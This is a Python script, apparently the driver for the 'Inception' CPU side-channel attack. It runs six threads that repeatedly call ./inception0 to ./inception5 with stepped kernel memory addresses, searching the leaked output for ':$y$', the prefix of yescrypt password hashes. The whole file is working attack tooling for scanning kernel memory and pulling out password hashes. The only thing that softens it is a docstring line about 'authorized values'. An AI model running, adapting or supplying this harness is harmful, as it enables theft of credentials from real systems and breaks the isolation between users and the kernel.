#!/usr/bin/env python3
"""
multi_exec_supervisor.py

Run multiple workers concurrently. Each worker can run a different executable
(with its own initial argument), watch the output for a pattern, kill the process
on match, and retry with updated arguments up to a max_retries.

USAGE: edit the `WORKERS_CONFIG` list below with safe/authorized values.
"""

import threading
import argparse
import subprocess
import time
import queue
import sys
from typing import Optional, List, Tuple

PRINT_LOCK = threading.Lock()

def safe_print(*a, **k):
    with PRINT_LOCK:
        print(*a, **k)
        sys.stdout.flush()

def increment_hex_addr(addr: str, offset: int = 0x1000) -> str:
    """Increment a hex-like string '0xdeadbeef' by offset and return a new hex string.
    If addr doesn't start with '0x', append an increasing suffix fallback."""
    if isinstance(addr, str) and addr.startswith("0x"):
        try:
            v = int(addr, 16)
            return hex(v + offset)
        except ValueError:
            pass
    # fallback
    return f"{addr}_+{offset:x}"

class Worker(threading.Thread):
    def __init__(
        self,
        name: str,
        executable: str,
        initial_arg: str,
        pattern: str,
        max_retries: int = 5,
        runtime_timeout: Optional[float] = 30.0,
        addr_increment: int = 0x1000,
        result_queue: Optional[queue.Queue] = None,
    ):
        super().__init__(name=name, daemon=True)
        self.executable = executable
        self.arg = initial_arg
        self.pattern = pattern
        self.max_retries = max_retries
        self.runtime_timeout = runtime_timeout
        self.addr_increment = addr_increment
        self.result_queue = result_queue
        self._stop_event = threading.Event()
        self.success = False
        self.attempts = 0

    def stop(self):
        self._stop_event.set()

    def run(self):
        safe_print(f"[{self.name}] starting with executable={self.executable!r}, initial_arg={self.arg!r}")
        for attempt in range(1, self.max_retries + 1):
            if self._stop_event.is_set():
                safe_print(f"[{self.name}] stop requested before attempt {attempt}.")
                break

            self.attempts = attempt
            safe_print(f"[{self.name}] attempt #{attempt}: running {self.executable} {self.arg}")
            try:
                found = self._run_and_watch(self.executable, self.arg, self.pattern, timeout=self.runtime_timeout)
            except Exception as e:
                safe_print(f"[{self.name}] error during run: {e!r}")
                found = False

            if found:
                safe_print(f"[{self.name}] pattern {self.pattern!r} found on attempt #{attempt}.")
                self.success = True
                if self.result_queue:
                    self.result_queue.put((self.name, True, self.executable, self.arg, attempt))
                break
            else:
                safe_print(f"[{self.name}] pattern not found on attempt #{attempt}.")
                # update the arg for next attempt
                try:
                    self.arg = increment_hex_addr(self.arg, offset=self.addr_increment)
                except Exception:
                    self.arg = f"{self.arg}_{attempt}"
                safe_print(f"[{self.name}] next arg -> {self.arg!r}")

        if not self.success:
            safe_print(f"[{self.name}] finished without success after {self.attempts} attempts.")
            if self.result_queue:
                self.result_queue.put((self.name, False, self.executable, self.arg, self.attempts))

    def _run_and_watch(self, executable: str, arg: str, pattern: str, timeout: Optional[float] = None) -> bool:
        """Run the subprocess, stream combined stdout+stderr, look for pattern."""
        # Build command as list to avoid shell injection; if arg is empty, pass no argument
        cmd: List[str] = [executable] + ([arg] if arg is not None and arg != "" else [])
        safe_print(f"[{self.name}] launching cmd: {cmd!r}")

        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            universal_newlines=True,
            errors='replace'
        )

        start_time = time.time()
        try:
            printout = False
            assert proc.stdout is not None
            for line in proc.stdout:
                if self._stop_event.is_set():
                    safe_print(f"[{self.name}] external stop requested; terminating child.")
                    self._terminate_proc(proc)
                    return False

                stripped = line.rstrip("\n")
                if printout is False and pattern in stripped:
                    printout = True
                    safe_print(f"[{self.name}] detected pattern in output;")

                if printout is True:
                    safe_print(f"[{self.name}] child: {stripped}")

                if timeout is not None and (time.time() - start_time) > timeout:
                    safe_print(f"[{self.name}] runtime timeout ({timeout}s) reached; terminating child.")
                    self._terminate_proc(proc)
                    return False

            # If loop exits, child finished normally
            proc.wait()
            safe_print(f"[{self.name}] child exited with returncode={proc.returncode}")
            return printout

        finally:
            # ensure child is dead before returning
            if proc.poll() is None:
                self._terminate_proc(proc)

    def _terminate_proc(self, proc: subprocess.Popen):
        try:
            proc.terminate()
            proc.wait(timeout=3)
        except Exception:
            try:
                proc.kill()
                proc.wait(timeout=1)
            except Exception:
                pass

def main():
    parser = argparse.ArgumentParser(description="Launch inception attack")
    parser.add_argument(
        "--base-addr",
        type=lambda x: int(x, 16),
        default=0xffff91edc0000000,
        help="Starting address (hex) to search from, e.g. 0xffff91edc0000000"
    )
    parser.add_argument(
		"--string",
		type=str,
		default=":$y$",
		help="Search string (no wildcards)"
	)
    
    args = parser.parse_args()
    
    base_addr = int(args.base_addr)
    timeout = 20.0
    retries = 400000
    
    # Each tuple: (name, executable_path, initial_arg, pattern, max_retries, runtime_timeout, addr_increment)
    WORKERS_CONFIG: List[Tuple[str,str,str,str,int,float,int]] = [
            ("worker-A", "./inception0", hex(base_addr), 		  args.string, retries, timeout, 0x6000),
            ("worker-B", "./inception1", hex(base_addr + 0x1000), args.string, retries, timeout, 0x6000),
            ("worker-C", "./inception2", hex(base_addr + 0x2000), args.string, retries, timeout, 0x6000),
            ("worker-D", "./inception3", hex(base_addr + 0x3000), args.string, retries, timeout, 0x6000),
            ("worker-E", "./inception4", hex(base_addr + 0x4000), args.string, retries, timeout, 0x6000),
            ("worker-F", "./inception5", hex(base_addr + 0x5000), args.string, retries, timeout, 0x6000),
    ]
    # ===========================================================

    # Validate and start workers
    result_q: queue.Queue = queue.Queue()
    workers: List[Worker] = []
    for cfg in WORKERS_CONFIG:
        name, exe, arg, pattern, max_retries, runtime_timeout, addr_increment = cfg
        w = Worker(
            name=name,
            executable=exe,
            initial_arg=arg,
            pattern=pattern,
            max_retries=max_retries,
            runtime_timeout=runtime_timeout,
            addr_increment=addr_increment,
            result_queue=result_q
        )
        workers.append(w)
        w.start()

    done = 0
    # Collect results
    try:
        while done == 0:
            try:
                name, success, exe, arg_used, attempts = result_q.get(timeout=1.0)
                status = "SUCCESS" if success else "FAIL"
                safe_print(f"[MAIN] {name} -> {status} (exe={exe}, attempts={attempts}, last_arg={arg_used})")
                if status == "SUCCESS":
                    done = 1

            except queue.Empty:
                # still waiting
                pass
    except KeyboardInterrupt:
        safe_print("[MAIN] KeyboardInterrupt: requesting workers stop...")
        for w in workers:
            w.stop()
        # allow threads to unwind
        time.sleep(1)

    for w in workers:
        w.stop()
    time.sleep(1)
    safe_print("[MAIN] All workers finished. Exiting.")

if __name__ == "__main__":
    main()

